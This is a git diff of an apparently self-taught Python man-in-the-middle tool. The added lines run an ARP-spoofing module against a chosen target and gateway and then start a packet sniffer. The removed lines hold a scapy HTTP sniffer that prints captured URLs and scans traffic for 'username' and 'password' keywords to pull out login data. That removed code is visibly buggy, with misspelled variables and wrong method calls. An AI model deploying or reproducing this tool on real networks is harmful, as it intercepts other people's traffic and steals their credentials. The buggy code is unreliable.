@@ -1,40 +1,29 @@
 #/usr/bin/env python
 
-import scapy.all as scapy
-from scapy.layers import http
+import optparse 
+import lib.arp_spoof as arp_spoof
+import lib.packet_sniffer as packet_sniffer
 
-import os
-import sys
-sys.path.append(os.path.abspath('../arpSpoof'))
+# sys.path.append(os.path.abspath('../arpSpoof'))
+# import arp_spoof
 
-import arpSpoof
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-g", "--gateway", dest = "gateway", help = "IP gateway")
+    parser.add_option("-t", "--target", dest = "target", help = "IP target")
+    parser.add_option("-i", "--interface", dest = "interface", help = "Listening interface")
+    (options, arguments) = parser.parse_args()
 
-def sniff(interface):
-    scapy.sniff(iface = interface, store = False, prn = proccess_sniffed_packet)
+    return options
 
-def get_url(packet):
-    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+def main():
+    options = get_arguments()
 
-def get_login_info(packet):
-    if packet.hasLayer(scapy.Raw): 
-        load = packet[scapy.Raw].load
-        keywords = ["username", "user", "login", "password", "pass"]
-    for keyword in keywords:
-        if keyword in load:
-            return laod    
-
-def proccess_sniffed_packet(packet):
-    if packet.hasLayer(http.HTTPRequest):
-        url = get_url()
+    target = options.target
+    gateway = options.gateway
+    interface = options.interface
+    arp_spoof.run(target, gateway)
     
-        print("[+] HTTP Request >> " + url)
+    packet_sniffer.sniff(interface)        
 
-        login_info = get_login_info(packet)
-        if login_info:
-            print("\n\n[+] Possible username/password > " + load + "\n\n")
-            
-def run():
-    arpSpoof.run()
-    sniff("eth0")        
-
-run()
+main()
